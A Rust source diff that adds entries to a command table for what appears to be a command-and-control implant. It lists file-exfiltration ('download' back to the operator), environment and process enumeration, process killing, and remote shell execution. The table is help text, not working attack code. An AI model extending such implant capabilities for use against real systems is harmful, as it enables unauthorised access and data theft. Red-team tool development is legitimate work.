@@ -15,7 +15,7 @@ pub const IMPLANT_COMMANDS: &[ImplantCommandInfo] = &[
     ImplantCommandInfo {
         name: "pwd",
         usage: "pwd",
-        description: "Print the implant's working directory",
+        description: "Print the working directory",
     },
     ImplantCommandInfo {
         name: "ls",
@@ -23,14 +23,89 @@ pub const IMPLANT_COMMANDS: &[ImplantCommandInfo] = &[
         description: "List a directory",
     },
     ImplantCommandInfo {
+        name: "cd",
+        usage: "cd <path>",
+        description: "Change the working directory",
+    },
+    ImplantCommandInfo {
         name: "cat",
         usage: "cat <file>",
         description: "Print a file's contents",
     },
     ImplantCommandInfo {
+        name: "download",
+        usage: "download <file>",
+        description: "Send a file back to the operator",
+    },
+    ImplantCommandInfo {
+        name: "mkdir",
+        usage: "mkdir <dir>",
+        description: "Create a directory",
+    },
+    ImplantCommandInfo {
+        name: "rm",
+        usage: "rm [-r] <path>",
+        description: "Remove a file or directory",
+    },
+    ImplantCommandInfo {
+        name: "mv",
+        usage: "mv <src> <dst>",
+        description: "Move or rename a file",
+    },
+    ImplantCommandInfo {
+        name: "cp",
+        usage: "cp [-r] <src> <dst>",
+        description: "Copy a file or directory",
+    },
+    ImplantCommandInfo {
+        name: "touch",
+        usage: "touch <file>",
+        description: "Create an empty file",
+    },
+    ImplantCommandInfo {
         name: "systeminfo",
         usage: "systeminfo",
         description: "Show system information",
+    },
+    ImplantCommandInfo {
+        name: "whoami",
+        usage: "whoami",
+        description: "Print the current user",
+    },
+    ImplantCommandInfo {
+        name: "env",
+        usage: "env",
+        description: "List environment variables",
+    },
+    ImplantCommandInfo {
+        name: "ps",
+        usage: "ps",
+        description: "List running processes",
+    },
+    ImplantCommandInfo {
+        name: "kill",
+        usage: "kill <pid>",
+        description: "Kill a process",
+    },
+    ImplantCommandInfo {
+        name: "sleep",
+        usage: "sleep <seconds>",
+        description: "Sleep on the implant",
+    },
+    ImplantCommandInfo {
+        name: "netstat",
+        usage: "netstat",
+        description: "Show network connections",
+    },
+    ImplantCommandInfo {
+        name: "ipconfig",
+        usage: "ipconfig",
+        description: "Show network interfaces",
+    },
+    ImplantCommandInfo {
+        name: "shell",
+        usage: "shell <command>",
+        description: "Run a shell command on the implant",
     },
 ];
 
